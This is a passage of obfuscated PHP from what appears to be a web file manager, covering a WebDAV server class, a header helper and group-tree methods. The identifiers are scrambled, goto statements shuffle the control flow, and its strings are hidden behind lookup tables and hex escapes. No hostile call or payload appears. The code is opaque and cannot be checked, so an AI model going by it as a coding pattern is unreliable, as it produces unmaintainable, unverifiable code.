$this->field($då¾×ğ¼ƒˆ[2148])->where($E™áÃÌŒÛÃ)->select(); $díµÂ‰«‡« = array_to_keyvalue($B©ÃŸéÇª¾, $då¾×ğ¼ƒˆ[2063], $då¾×ğ¼ƒˆ[28]); $a£Õ±Ñ˜Ì– = array_merge_index($a£Õ±Ñ˜Ì–, $díµÂ‰«‡«); } goto dæÑĞ§á¡; bï¸§‹«Ş: } private function _listAppendSourceRoot(&$aòÜÓ²ğôï, $C¦¥Ò‡†š) { goto cÍº¤‘ÖÅ›; cÍº¤‘ÖÅ›: $a„½áÂµ´ =& $_SERVER[Ä¿Ş°¨]; $D‘ƒ±Šİ™‘ = array($a„½áÂµ´[376] => SourceModel::TYPE_GROUP, $a„½áÂµ´[465] => 0, $a„½áÂµ´[460] => array($a„½áÂµ´[7], $C¦¥Ò‡†š)); $CÈô¥å·²æ = $a„½áÂµ´[2149]; goto eÁÚÅà¼À; eÁÚÅà¼À: $BÚ§ ¿¨¯Š = Model($a„½áÂµ´[746])->order($a„½áÂµ´[2150])->field($CÈô¥å·²æ)->where($D‘ƒ±Šİ™‘)->select(); $BÚ§ ¿¨¯Š = array_to_keyvalue($BÚ§ ¿¨¯Š, $a„½áÂµ´[460]); $BÚ§ ¿¨¯Š = array_remove_key($BÚ§ ¿¨¯Š, $a„½áÂµ´[460]); goto e¼µÃ•Ï¶£; e¼µÃ•Ï¶£: foreach ($aòÜÓ²ğôï as &$FÎÃõŒ £º) { $FÎÃõŒ £º[$a„½áÂµ´[396]] = $BÚ§ ¿¨¯Š[$FÎÃõŒ £º[$a„½áÂµ´[2063]]] ? $BÚ§ ¿¨¯Š[$FÎÃõŒ £º[$a„½áÂµ´[2063]]] : array(); } goto fÂòà¹•¤·; fÂòà¹•¤·: } protected function resetParentLevel() { $eÙá§ŞçæÍ =& $_SERVER[Ä¿Ş°¨]; $b¨š…Æ¨Ü¡ = $eÙá§ŞçæÍ[2063]; $a¹ä†…‰Ïï = $this->select(); $a¹ä†…‰Ïï = array_to_keyvalue($a¹ä†…‰Ïï, $b¨š…Æ¨Ü¡); foreach ($a¹ä†…‰Ïï as $c“Å´÷±Üº) { goto A„åª›ÊôÚ; f¤¼¥ªäÓÀ: $this->where(array($b¨š…Æ¨Ü¡ => $c“Å´÷±Üº[$b¨š…Æ¨Ü¡]))->save(array($eÙá§ŞçæÍ[529] => $BŒµïœØææ)); goto EÄó­´”¼; A„åª›ÊôÚ: $E¾ÕÑ¹‰ = $c“Å´÷±Üº; $BŒµïœØææ = array(); while ($E¾ÕÑ¹‰[$eÙá§ŞçæÍ[465]] != 0) { $BŒµïœØææ[] = $E¾ÕÑ¹‰[$eÙá§ŞçæÍ[465]]; $E¾ÕÑ¹‰ = $a¹ä†…‰Ïï[$E¾ÕÑ¹‰[$eÙá§ŞçæÍ[465]]]; } goto E‚Á¶‹¿¬; E‚Á¶‹¿¬: $BŒµïœØææ[] = 0; $BŒµïœØææ = $eÙá§ŞçæÍ[47] . implode($eÙá§ŞçæÍ[47], array_reverse($BŒµïœØææ)) . $eÙá§ŞçæÍ[47]; $this->setNamePinyin($c“Å´÷±Üº[$b¨š…Æ¨Ü¡], $c“Å´÷±Üº[$eÙá§ŞçæÍ[28]]); goto f¤¼¥ªäÓÀ; EÄó­´”¼: } return $a¹ä†…‰Ïï; } public function groupNameAuto($AØ‡‰¯œÖ×, $AÉ¿–îÖÂè) { $D¬Ÿ¨âªÇ’ =& $_SERVER[Ä¿Ş°¨]; $D„±‘‹‘Œ˜ = $this->where(array($D¬Ÿ¨âªÇ’[373] => $AØ‡‰¯œÖ×))->getField($D¬Ÿ¨âªÇ’[28], !0); if (!$D„±‘‹‘Œ˜ || !in_array($AÉ¿–îÖÂè, $D„±‘‹‘Œ˜)) { return $AÉ¿–îÖÂè; } for ($Fšòñß˜Ï = 1; $Fšòñß˜Ï <= count($D„±‘‹‘Œ˜) + 1; $Fšòñß˜Ï++) { $c””ñ¹¿Š = $AÉ¿–îÖÂè . "\x28{$Fšòñß˜Ï}\51"; if (!in_array($c””ñ¹¿Š, $D„±‘‹‘Œ˜)) { return $c””ñ¹¿Š; } } } } goto døÑäŸ¡¶; e‹³ÒÆÖ˜õ: class HttpDavServer { public function __construct($dåÍ¤ÇÃí, $D‡í„ßÕ£Í) { $this->root = $dåÍ¤ÇÃí; $this->initPath($D‡í„ßÕ£Í); $this->start(); } public function initPath($f°ğ‘İÂø´) { $C«ˆò”— =& $_SERVER[Ä¿Ş°¨]; $d‰Š¦´Ë…¸ = rtrim($_SERVER[$C«ˆò”—[1350]], $C«ˆò”—[8]) . $C«ˆò”—[8]; $this->urlBase = substr($d‰Š¦´Ë…¸, 0, strpos($d‰Š¦´Ë…¸, $f°ğ‘İÂø´) + 1); $this->urlBase = rtrim($this->urlBase, $C«ˆò”—[8]) . $f°ğ‘İÂø´; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $eˆñµ×Ñ“ =& $_SERVER[Ä¿Ş°¨]; $B½¹Ïƒ–µ” = HttpAuth::get(); if ($B½¹Ïƒ–µ”[$eˆñµ×Ñ“[539]] == $eˆñµ×Ñ“[1743] && $B½¹Ïƒ–µ”[$eˆñµ×Ñ“[884]] == $eˆñµ×Ñ“[1744]) { return !0; } HttpAuth::error(); } public function start() { goto C¤´ìÌ…ñÃ; eŸÛ½—•Éâ: if (!method_exists($this, $CĞÓö°ñ°¦)) { pr($CĞÓö°ñ°¦ . $aÜÙÅª·‡[1745]); die; } $AÓèŒÚùè = array($aÜÙÅª·‡[1746], $aÜÙÅª·‡[1747]); if (!in_array($CĞÓö°ñ°¦, $AÓèŒÚùè) && !$this->pathExists($this->path)) { $fÄÚ÷á˜ğˆ = array($aÜÙÅª·‡[1017] => 404); } else { $fÄÚ÷á˜ğˆ = $this->{$CĞÓö°ñ°¦}(); } goto E³Œµ…Šøš; C¤´ìÌ…ñÃ: $aÜÙÅª·‡ =& $_SERVER[Ä¿Ş°¨]; $this->checkUser(); $CĞÓö°ñ°¦ = $aÜÙÅª·‡[142] . HttpHeader::method(); goto eŸÛ½—•Éâ; E³Œµ…Šøš: if (!$fÄÚ÷á˜ğˆ) { return; } self::response($fÄÚ÷á˜ğˆ); goto e‘ˆÅ‚““; e‘ˆÅ‚““: } public function pathGet($dÉ¤ŞëÙ† = false) { $e¢ŠŒ®ôÆ =& $_SERVER[Ä¿Ş°¨]; $Bğñé…ß§ = $dÉ¤ŞëÙ† ? $_SERVER[$e¢ŠŒ®ôÆ[1748]] : $_SERVER[$e¢ŠŒ®ôÆ[1350]]; $Bğñé…ß§ = KodIO::clear(rawurldecode($Bğñé…ß§)); if (!strstr($Bğñé…ß§, KodIO::clear($this->urlBase))) { return !1; } return substr($Bğñé…ß§, strpos($Bğñé…ß§, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($DÜ´ŠÃçƒ) { return file_exists($DÜ´ŠÃçƒ); } public function pathMkdir($C÷çèŠ›ÁŸ) { return mkdir($C÷çèŠ›ÁŸ, 511, !0); } public function pathInfo($AîòÎÛÈÎ«) { return path_info($AîòÎÛÈÎ«); } public function pathList($cÚ™À–¸¼é) { return path_list($cÚ™À–¸¼é); } public function pathOut($FÆÅßõßĞä) { echo file_get_contents($FÆÅßõßĞä); } public function pathPut($E°ƒ‚—ñÎ„, $cÍ…–¾‚ğ« = '') { if (!$cÍ…–¾‚ğ«) { return file_put_contents($E°ƒ‚—ñÎ„, $_SERVER[Ä¿Ş°¨][33]); } return move_path($cÍ…–¾‚ğ«, $E°ƒ‚—ñÎ„); } public function pathRemove($AÍî™Ê¨¼¥) { if (is_file($AÍî™Ê¨¼¥)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($Aëå»›‡Ê‚, $bò‚ÇÎª“) { return move_path($Aëå»›‡Ê‚, $bò‚ÇÎª“); } public function pathCopy($bİË‘¬¼ªÂ, $dñ¯Í‰ÁĞ‰) { return copy_dir($bİË‘¬¼ªÂ, $dñ¯Í‰ÁĞ‰); } public function parsePath($F¹ÛàõÄ°‘) { return $F¹ÛàõÄ°‘; } public function parseItem($AôÃ™¾²ô, $CêÛ«¾Ş“¼) { goto d‰ÏÎ¸Ñµâ; C»•¦¡Ó: if ($CêÛ«¾Ş“¼) { $F°ÛšÊÁÍ = $aùƒ‹İ¤[8] . str_replace($aùƒ‹İ¤[168], $aùƒ‹İ¤[8], rawurlencode($this->pathGet())); } if (!trim($AôÃ™¾²ô[$aùƒ‹İ¤[106]])) { $AôÃ™¾²ô[$aùƒ‹İ¤[106]] = time(); } if (!trim($AôÃ™¾²ô[$aùƒ‹İ¤[183]])) { $AôÃ™¾²ô[$aùƒ‹İ¤[183]] = time(); } goto bÓÚğÂôî¸; bÓÚğÂôî¸: $a‚ÚŠ¤£á = array($aùƒ‹İ¤[1749] => KodIO::clear($this->urlBase . $F°ÛšÊÁÍ), $aùƒ‹İ¤[106] => @gmdate($aùƒ‹İ¤[1750], $AôÃ™¾²ô[$aùƒ‹İ¤[106]]), $aùƒ‹İ¤[183] => @gmdate($aùƒ‹İ¤[1751], $AôÃ™¾²ô[$aùƒ‹İ¤[183]]), $aùƒ‹İ¤[77] => $AôÃ™¾²ô[$aùƒ‹İ¤[77]] ? $AôÃ™¾²ô[$aùƒ‹İ¤[77]] : 0); return $a‚ÚŠ¤£á; goto bØ šíßÅ; d‰ÏÎ¸Ñµâ: $aùƒ‹İ¤ =& $_SERVER[Ä¿Ş°¨]; $F°ÛšÊÁÍ = $this->pathGet() . $aùƒ‹İ¤[8] . $AôÃ™¾²ô[$aùƒ‹İ¤[28]]; $F°ÛšÊÁÍ = $aùƒ‹İ¤[8] . str_replace($aùƒ‹İ¤[168], $aùƒ‹İ¤[8], rawurlencode($F°ÛšÊÁÍ)); goto C»•¦¡Ó; bØ šíßÅ: } public function parseItemXml($A¿è†ÚÔö¬, $Aç›ãó“¹) { $EŠÏ®ê²—  =& $_SERVER[Ä¿Ş°¨]; $EÖ‰Ğéß£ = $this->parseItem($A¿è†ÚÔö¬, $Aç›ãó“¹); if ($A¿è†ÚÔö¬[$EŠÏ®ê²— [29]] == $EŠÏ®ê²— [76]) { $B‘¬ëÄ™æñ = $EŠÏ®ê²— [1752]; $B‘¬ëÄ™æñ .= $EŠÏ®ê²— [1753]; } else { $dß¿†¤ÌŒÒ = $A¿è†ÚÔö¬[$EŠÏ®ê²— [156]] ? $A¿è†ÚÔö¬[$EŠÏ®ê²— [156]] : get_path_ext($A¿è†ÚÔö¬[$EŠÏ®ê²— [28]]); $Fë±ĞˆŒ = get_file_mime($dß¿†¤ÌŒÒ); $B‘¬ëÄ™æñ = $EŠÏ®ê²— [1754]; $B‘¬ëÄ™æñ .= "\x3c\104\72\x67\x65\x74\x63\x6f\156\164\x65\x6e\164\164\x79\160\x65\x3e{$Fë±ĞˆŒ}\x3c\57\x44\x3a\x67\x65\x74\x63\x6f\x6e\164\x65\x6e\164\164\x79\x70\145\x3e"; } return "\xa\x9\x9\x3c\x44\x3a\162\145\x73\x70\157\156\x73\x65\x3e\xa\x9\x9\x9\74\x44\72\150\x72\145\x66\x3e{$EÖ‰Ğéß£[$EŠÏ®ê²— [1749]]}\74\57\x44\72\x68\x72\x65\x66\76\xa\11\x9\11\74\x44\x3a\160\162\157\x70\163\x74\141\164\76\12\x9\11\11\x9\x3c\x44\x3a\160\x72\x6f\x70\x3e\12\11\x9\11\x9\x9\x3c\104\x3a\147\x65\164\x6c\x61\163\x74\x6d\157\144\151\146\x69\x65\x64\x3e{$EÖ‰Ğéß£[$EŠÏ®ê²— [106]]}\x3c\x2f\x44\x3a\147\x65\x74\x6c\x61\x73\164\155\x6f\144\x69\146\151\x65\144\76\12\11\11\x9\11\11\74\x44\x3a\143\x72\x65\x61\164\151\157\156\144\141\x74\145\76{$EÖ‰Ğéß£[$EŠÏ®ê²— [183]]}\x3c\57\104\72\x63\162\145\x61\164\x69\157\x6e\x64\x61\164\145\x3e\xa\x9\11\x9\x9\x9\74\104\72\x67\145\164\x63\157\156\164\145\x6e\x74\154\145\x6e\147\x74\x68\76{$EÖ‰Ğéß£[$EŠÏ®ê²— [77]]}\74\57\104\x3a\147\145\164\x63\157\156\164\145\x6e\164\x6c\x65\156\147\164\x68\x3e\12\11\11\x9\x9\x9{$B‘¬ëÄ™æñ}\xa\x9\x9\x9\x9\74\57\104\72\x70\x72\x6f\160\x3e\12\11\11\11\11\74\x44\x3a\163\164\141\x74\x75\163\x3e\x48\124\x54\120\x2f\61\56\61\40\x32\x30\60\40\x4f\x4b\74\x2f\x44\72\163\164\141\x74\x75\x73\x3e\xa\x9\11\x9\x3c\x2f\104\72\160\162\x6f\160\x73\x74\x61\x74\x3e\12\x9\11\74\57\104\x3a\x72\145\x73\x70\x6f\156\163\x65\x3e"; } public function pathListMerge($E¢îÔÓ­„¯) { goto E¿²º¸ó§¬; aÀ²Â°«¹Ù: $cµ‘Ú‚ÉÉŠ = array(); foreach ($E¢îÔÓ­„¯ as $Aï’Š‰‡ñÇ => $B³’ÚÍÁğ) { if (!in_array($Aï’Š‰‡ñÇ, $EÈò»ë™ó) || !is_array($B³’ÚÍÁğ)) { continue; } $cµ‘Ú‚ÉÉŠ = array_merge($cµ‘Ú‚ÉÉŠ, $B³’ÚÍÁğ); } foreach ($cµ‘Ú‚ÉÉŠ as &$A¢·˜Á„) { $A¢·˜Á„[$cŸ•À™®À[28]] = str_replace($cŸ•À™®À[8], $cŸ•À™®À[1352], $A¢·˜Á„[$cŸ•À™®À[28]]); } goto CˆÏÂáõ»‘; E¿²º¸ó§¬: $cŸ•À™®À =& $_SERVER[Ä¿Ş°¨]; if (!$E¢îÔÓ­„¯) { return $E¢îÔÓ­„¯; } $EÈò»ë™ó = array($cŸ•À™®À[73], $cŸ•À™®À[74], $cŸ•À™®À[1755]); goto aÀ²Â°«¹Ù; CˆÏÂáõ»‘: return $cµ‘Ú‚ÉÉŠ; goto f‰êéïª¦; f‰êéïª¦: } public function httpPROPFIND() { goto a´º¤¦ßï; CŸÏâë‡…Ì: $EŠ’õ«ğÕí = $C›—¨–øòÕ[$dâò½œßçİ[1756]]; if (!is_array($e™¢–ÑßÌ’) || $EŠ’õ«ğÕí[$dâò½œßçİ[1757]] === !1) { return array($dâò½œßçİ[1758] => 404, $dâò½œßçİ[1759] => $dâò½œßçİ[1760]); } $B—ˆ¤†¢¶° = $EŠ’õ«ğÕí[$dâò½œßçİ[29]] == $dâò½œßçİ[163] || HttpHeader::get($dâò½œßçİ[1734]) == $dâò½œßçİ[472]; goto d’äšŞÄ®; d’äšŞÄ®: if ($B—ˆ¤†¢¶°) { $e™¢–ÑßÌ’ = array($EŠ’õ«ğÕí); } else { $EŠ’õ«ğÕí[$dâò½œßçİ[28]] = $dâò½œßçİ[33]; $e™¢–ÑßÌ’ = array_merge(array($EŠ’õ«ğÕí), $e™¢–ÑßÌ’); } $dìÍÆçÈæ— = $dâò½œßçİ[33]; foreach ($e™¢–ÑßÌ’ as $F¶Û®ÅœÊ¤) { $dìÍÆçÈæ— .= $this->parseItemXml($F¶Û®ÅœÊ¤, $B—ˆ¤†¢¶°); } goto DŞÖãÔÁ×; DŞÖãÔÁ×: return array($dâò½œßçİ[1758] => 207, $dâò½œßçİ[1759] => "\x3c\x44\72\155\165\154\164\151\x73\x74\141\x74\x75\163\x20\x78\x6d\x6c\x6e\x73\x3a\104\75\42\x44\101\126\72\x22\x3e\xa{$dìÍÆçÈæ—}\12\x3c\x2f\104\72\155\165\x6c\x74\x69\163\164\141\164\165\x73\76"); goto b¶æÍ‡˜°; a´º¤¦ßï: $dâò½œßçİ =& $_SERVER[Ä¿Ş°¨]; $C›—¨–øòÕ = $this->pathList($this->path); $e™¢–ÑßÌ’ = $this->pathListMerge($C›—¨–øòÕ); goto CŸÏâë‡…Ì; b¶æÍ‡˜°: } public function httpHEAD() { $cõ®°Ğ¢‚Ş =& $_SERVER[Ä¿Ş°¨]; $a¯ÌîŒ†ù = $this->pathInfo($this->path); if (!$a¯ÌîŒ†ù || $a¯ÌîŒ†ù[$cõ®°Ğ¢‚Ş[29]] == $cõ®°Ğ¢‚Ş[76]) { return array($cõ®°Ğ¢‚Ş[1017] => 200, $cõ®°Ğ¢‚Ş[1184] => array($cõ®°Ğ¢‚Ş[1761])); } return array($cõ®°Ğ¢‚Ş[1017] => 200, $cõ®°Ğ¢‚Ş[1184] => array($cõ®°Ğ¢‚Ş[1762], $cõ®°Ğ¢‚Ş[135], $cõ®°Ğ¢‚Ş[1763] . $a¯ÌîŒ†ù[$cõ®°Ğ¢‚Ş[77]], $cõ®°Ğ¢‚Ş[1764] . get_file_mime($a¯ÌîŒ†ù[$cõ®°Ğ¢‚Ş[156]]), $cõ®°Ğ¢‚Ş[131] . gmdate($cõ®°Ğ¢‚Ş[1750], $a¯ÌîŒ†ù[$cõ®°Ğ¢‚Ş[1231]]) . $cõ®°Ğ¢‚Ş[1765], $cõ®°Ğ¢‚Ş[1766])); } public function httpOPTIONS() { $bâÍ°…¤í =& $_SERVER[Ä¿Ş°¨]; return array($bâÍ°…¤í[1017] => 200, $bâÍ°…¤í[1184] => array($bâÍ°…¤í[1767], $bâÍ°…¤í[1768], $bâÍ°…¤í[1769], $bâÍ°…¤í[1240])); } public function httpPROPPATCH() { $bìøàâÒ¢Ø =& $_SERVER[Ä¿Ş°¨]; $f¡¶£Ş­ = $bìøàâÒ¢Ø[1770] . $_SERVER[$bìøàâÒ¢Ø[1350]] . $bìøàâÒ¢Ø[1771]; return array($bìøàâÒ¢Ø[1758] => 207, $bìøàâÒ¢Ø[1759] => "\74\104\72\155\165\154\x74\151\x73\x74\x61\x74\165\x73\40\x78\155\154\156\163\x3a\104\x3d\42\104\101\x56\72\42\x3e\xa{$f¡¶£Ş­}\12\x3c\57\x44\x3a\155\x75\x6c\164\x69\x73\x74\x61\164\165\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $E—¸Úò¯ =& $_SERVER[Ä¿Ş°¨]; $DÆŞ‰áŠî = $this->uploadFile(); if ($DÆŞ‰áŠî) { $e‘Ôê‘± = 204; } else { $DÆŞ‰áŠî = $E—¸Úò¯[33]; $e‘Ôê‘± = 201; } $D®î¹ÎÕå = $this->pathPut($this->path, $DÆŞ‰áŠî); if ($D®î¹ÎÕå == !1) { $e‘Ôê‘± = 404; } return array($E—¸Úò¯[1758] => $e‘Ôê‘±); } private function uploadFile() { goto Dµ‡ŠØ×¬; AÉí§…Äã½: while (!feof($D˜²Ã»ã¢)) { fwrite($Bê±…”ë„Ê, fread($D˜²Ã»ã¢, 1024 * 200)); } fclose($D˜²Ã»ã¢); fclose($Bê±…”ë„Ê); goto C‹‚í×ò£»; D•ÑÓšö©ô: $Bê±…”ë„Ê = @fopen($cË¶šÙ…Û½, $d¯à‘ËÉ¹ï[1479]); $D˜²Ã»ã¢ = @fopen($d¯à‘ËÉ¹ï[1773], $d¯à‘ËÉ¹ï[1478]); if (!$D˜²Ã»ã¢ || !$Bê±…”ë„Ê) { @unlink($cË¶šÙ…Û½); return !1; } goto AÉí§…Äã½; C‹‚í×ò£»: if (@filesize($cË¶šÙ…Û½) > 0) { return $cË¶šÙ…Û½; } @unlink($cË¶šÙ…Û½); return !1; goto b²ôÚ˜¾İ; Dµ‡ŠØ×¬: $d¯à‘ËÉ¹ï =& $_SERVER[Ä¿Ş°¨]; @mk_dir(TEMP_FILES); $cË¶šÙ…Û½ = TEMP_FILES . $d¯à‘ËÉ¹ï[1772] . rand_string(32); goto D•ÑÓšö©ô; b²ôÚ˜¾İ: } public function httpMKCOL() { $EÕÍÛËÍêØ =& $_SERVER[Ä¿Ş°¨]; if ($this->pathExists($this->path)) { return array($EÕÍÛËÍêØ[1017] => 409); } $Fø™Š‚ä÷à = $this->pathMkdir($this->path); return array($EÕÍÛËÍêØ[1017] => $Fø™Š‚ä÷à ? 201 : 403); } public function httpMOVE() { $a„ããÅõùƒ =& $_SERVER[Ä¿Ş°¨]; $eéÔºƒ‚è = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$a„ããÅõùƒ[1774]])) { $A¥í×™ìø²[$a„ããÅõùƒ[1775]] = $_SERVER[$a„ããÅõùƒ[1774]] == $a„ããÅõùƒ[1776]; } $f¿ßİØ• = $this->pathMove($this->path, $eéÔºƒ‚è); return array($a„ããÅõùƒ[1017] => $f¿ßİØ• ? 201 : 404); } public function httpCOPY() { $D±ŠĞÑÏºÈ = $this->parsePath($this->pathGet(!0)); $AËÚêæ‘Øë = $this->pathCopy($this->path, $D±ŠĞÑÏºÈ); return array($_SERVER[Ä¿Ş°¨][1017] => $AËÚêæ‘Øë ? 201 : 404); } public function httpDELETE() { $D¹—Ğ©ì = $this->pathRemove($this->path); return array($_SERVER[Ä¿Ş°¨][1017] => $D¹—Ğ©ì ? 200 : 503); } public function httpLOCK() { $e Ñ·Ğ…ø =& $_SERVER[Ä¿Ş°¨]; $d¿Ş¾”—õ = md5($this->path); $bĞÖ®í“Î = $e Ñ·Ğ…ø[1777] . $this->xmlGet($e Ñ·Ğ…ø[1778]) . $e Ñ·Ğ…ø[1779] . $d¿Ş¾”—õ . $e Ñ·Ğ…ø[1780]; return array($e Ñ·Ğ…ø[1017] => 200, $e Ñ·Ğ…ø[1184] => array($e Ñ·Ğ…ø[1781] . $d¿Ş¾”—õ, $e Ñ·Ğ…ø[1782]), $e Ñ·Ğ…ø[1783] => $bĞÖ®í“Î); } public function httpUNLOCK() { return array($_SERVER[Ä¿Ş°¨][1017] => 204); } public function xmlGet($EÒôŠ—ñ) { goto c¤³·¿»Ë¶; f‘´í®áó‹: $e² ±‰á¾Œ = array_shift(explode($c„‡ŞİĞÓÉ[8], $EÒôŠ—ñ)); $Cß‘áôİ®é = $B¶š×´õ´->getElementsByTagNameNS($c„‡ŞİĞÓÉ[1785], $e² ±‰á¾Œ); if ($Cß‘áôİ®é) { return $Cß‘áôİ®é[0]->nodeValue; } goto dŸ’©”š´÷; c¤³·¿»Ë¶: $c„‡ŞİĞÓÉ =& $_SERVER[Ä¿Ş°¨]; static $B¶š×´õ´ = false; if (!$B¶š×´õ´) { $A·íŠ½ Àµ = file_get_contents($c„‡ŞİĞÓÉ[1784]); $B¶š×´õ´ = new DOMDocument(); $B¶š×´õ´->loadXML($A·íŠ½ Àµ); } goto f‘´í®áó‹; dŸ’©”š´÷: return $c„‡ŞİĞÓÉ[33]; goto bÈÇ°…Ç…; bÈÇ°…Ç…: } public static function response($eŠ…„‚…ò) { goto døöÂ¡«Ã„; Bùœø¨×‹Ô: if (is_string($eŠ…„‚…ò[$EÎÉ¿›‡Ï¡[1783]])) { header($EÎÉ¿›‡Ï¡[1786]); $eÖƒ”Éº‚ = $EÎÉ¿›‡Ï¡[1787] . $EÎÉ¿›‡Ï¡[213] . $eŠ…„‚…ò[$EÎÉ¿›‡Ï¡[1783]]; echo $eÖƒ”Éº‚; } goto A¥ÁƒÔÔÁ•; CìÓ‚Áï˜Ô: $f¹½’¢†‹Á[] = $EÎÉ¿›‡Ï¡[1724]; $f¹½’¢†‹Á[] = $EÎÉ¿›‡Ï¡[1725]; foreach ($f¹½’¢†‹Á as $BİêÁ„ÔË›) { header($BİêÁ„ÔË›); } goto Bùœø¨×‹Ô; døöÂ¡«Ã„: $EÎÉ¿›‡Ï¡ =& $_SERVER[Ä¿Ş°¨]; $f¹½’¢†‹Á = is_array($eŠ…„‚…ò[$EÎÉ¿›‡Ï¡[1184]]) ? $eŠ…„‚…ò[$EÎÉ¿›‡Ï¡[1184]] : array(); $f¹½’¢†‹Á[] = HttpHeader::code($eŠ…„‚…ò[$EÎÉ¿›‡Ï¡[1017]]); goto CìÓ‚Áï˜Ô; A¥ÁƒÔÔÁ•: } } class HttpHeader { public static $_headers = array("\x48\x6f\163\x74" => "\x48\124\124\120\x5f\x48\x4f\x53\x54", "\x55\163\x65\162\x2d\101\147\x65\x6e\x74" => "\110\124\124\x50\137\125\123\x45\122\137\x41\107\x45\x4e\x54", "\x43\x6f\156\x74\145\x6e\x74\55\x54\171\160\x65" => "\110\x54\124\120\137\103\117\x4e\x54\105\x4e\x54\137\x54\131\120\105", "\x43\157\x6e\x74\145\156\164\x2d\x4c\145\x6e\147\x74\x68" => "\x48\124\124\120\137\103\x4f\x4e\124\x45\116\x54\137\x4c\x45\x4e\107\124\110", "\104\145\x70\164\150" => "\110\124\x54\120\x5f\x44\105\120\124\110", "\105\170\160\x65\143\164" => "\110\124\x54\x50\137\105\130\120\105\x43\x54", "\x49\x66\55\116\x6f\156\x65\x2d\115\x61\x74\143\150" => "\x48\124\124\120\x5f\x49\106\x5f\116\117\x4e\x45\x5f\115\101\124\x43\110", "\111\146\55\115\x61\164\x63\x68" => "\x48\x54\x54\120\x5f\x49\106\x5f\x4d\x41\x54\x43\x48", "\x49\x66\55\122\141\x6e\147\145" => "\x48\124\124\120\x5f\111\106\x5f\x52\101\116\x47\105", "\x4c\141\163\164\x2d\x4d\157\144\x69\146\151\x65\144" => "\110\124\x54\x50\x5f\114\x41\x53\x54\x5f\x4d\x4f\x44\111\x46\111\x45\x44", "\111\x66\x2d\115\157\x64\151\146\151\145\x64\x2d\123\x69\x6e\x63\145" => "\110\x54\124\120\x5f\111\x46\x5f\115\117\104\x49\106\111\105\104\137\x53\x49\116\x43\105", "\x49\x66\55\125\156\x6d\x6f\144\x69\x66\151\x65\144\x2d\x53\151\156\x63\145" => "\110\x54\124\120\137\111\x46\x5f\x55\x4e\115\x4f\x44\111\106\111\x45\x44\137\x53\111\116\x43\105", "\x52\x61\x6e\147\x65" => "\x48\x54\124\120\137\122\x41\x4e\x47\105", "\124\x69\155\145\157\x75\164" => "\110\124\x54\x50\x5f\x54\111\115\105\117\x55\124", "\111\146" => "\110\124\x54\x50\x5f\111\x46", "\114\x6f\x63\153\x2d\124\157\153\x65\x6e" => "\x48\x54\124\x50\137\114\117\103\x4b\x5f\124\117\113\x45\x4e", "\x4f\166\x65\x72\167\x72\x69\x74\145" => "\110\124\124\120\x5f\x4f\126\105\x52\127\122\x49\x54\x45", "\104\145\x73\x74\x69\156\x61\x74\151\x6f\156" => "\110\124\x54\120\137\x44\105\123\x54\111\116\101\124\x49\117\x4e", "\122\x65\161\165\145\163\x74\x2d\x49\144" => "\122\x45\x51\x55\x45\123\x54\x5f\111\x44", "\x52\145\161\x75\145\163\x74\55\x42\157\144\171\55\106\x69\x6c\145" => "\x52\105\121\125\105\x53\x54\137\x42\x4f\104\x59\x5f\x46\111\114\x45", "\x52\145\144\151\x72\x65\x63\164\55\123\x74\x61\x74\x75\163" => "\122\x45\104\111\x52\105\x43\124\x5f\123\124\x41\124\x55\x53"); public static function init() { static $aäÃœÉ¾ª‚ = false; if ($aäÃœÉ¾ª‚) { return; } foreach ($_SERVER as $e‰‹İù Ø => $EâØ« â£±) { $e‰‹İù Ø = strtoupper($e‰‹İù Ø); if (!array_key_exists($e‰‹İù Ø, $_SERVER)) { continue; } $_SERVER[$e‰‹İù Ø] = $EâØ« â£±; } foreach (self::$_headers as $e‰‹İù Ø => $A¾·è„‡’ß) { if (!array_key_exists($e‰‹İù Ø, $_SERVER)) { continue; } $_SERVER[$e‰‹İù Ø] = $_SERVER[$A¾·è„‡’ß]; $_SERVER[strtoupper($e‰‹İù Ø)] = $_SERVER[$A¾·è„‡’ß]; } } public static function get($AŠñÒšœ) { self::init(); return $_SERVER[$AŠñÒšœ] ? $_SERVER[$AŠñÒšœ] : $_SERVER[$_SERVER[Ä¿Ş°¨][1788] . strtoupper($AŠñÒšœ)]; } public static function method() { return strtoupper(self::get($_SERVER[Ä¿Ş°¨][150])); } public static function length() { $DÉ˜¦àÊÚ =& $_SERVER[Ä¿Ş°¨]; $BÓ×ËÄ†Ìß = self::get($DÉ˜¦àÊÚ[1789]); if (!$BÓ×ËÄ†Ìß) { $BÓ×ËÄ†Ìß = self::get($DÉ˜¦àÊÚ[1123]); } return $BÓ×ËÄ†Ìß; } public static function range() { $F¡¶î¨Ã™Ÿ =& $_SERVER[Ä¿Ş°¨]; $cÆÅË¸ÂŸ¢ = self::get($F¡¶î¨Ã™Ÿ[194]); if (!$cÆÅË¸ÂŸ¢) { return !1; } if (!preg_match($F¡¶î¨Ã™Ÿ[1790], $cÆÅË¸ÂŸ¢, $BŒ”³ŞÄÔÛ)) { return !1; } if ($BŒ”³ŞÄÔÛ[1] === $F¡¶î¨Ã™Ÿ[33] && $BŒ”³ŞÄÔÛ[2] === $F¡¶î¨Ã™Ÿ[33]) { return !1; } return array($BŒ”³ŞÄÔÛ[1] !== $F¡¶î¨Ã™Ÿ[33] ? $BŒ”³ŞÄÔÛ[1] : null, $BŒ”³ŞÄÔÛ[2] !== $F¡¶î¨Ã™Ÿ[33] ? $BŒ”³ŞÄÔÛ[2] : null); } public static $statusCode = array("\x31\x30\x30" => "\103\157\156\164\x69\x6e\165\145", "\61\x30\61" => "\123\167\x69\x74\143\150\x69\x6e\x67\x20\x50\162\157\x74\157\143\157\154", "\x31\60\62" => "\x50\x72\x6f\143\x65\x73\x73\x69\x6e\x67", "\x31\x30\63" => "\x45\141\x72\154\x79\40\x48\x69\x6e\x74\x73", "\62\60\x30" => "\117\x4b", "\x32\x30\61" => "\103\162\145\x61\x74\145\x64", "\x32\60\x32" => "\x41\143\x63\x65\160\x74\145\x64", "\62\x30\x33" => "\116\x6f\x6e\x2d\101\x75\164\150\157\x72\x69\164\x61\x74\x69\x76\145\40\x49\x6e\146\x6f\162\155\141\x74\151\157\156", "\62\x30\x34" => "\x4e\x6f\40\103\157\x6e\x74\145\x6e\164", "\x32\x30\x35" => "\122\x65\163\x65\164\x20\x43\x6f\x6e\x74\145\x6e\164", "\x32\x30\x36" => 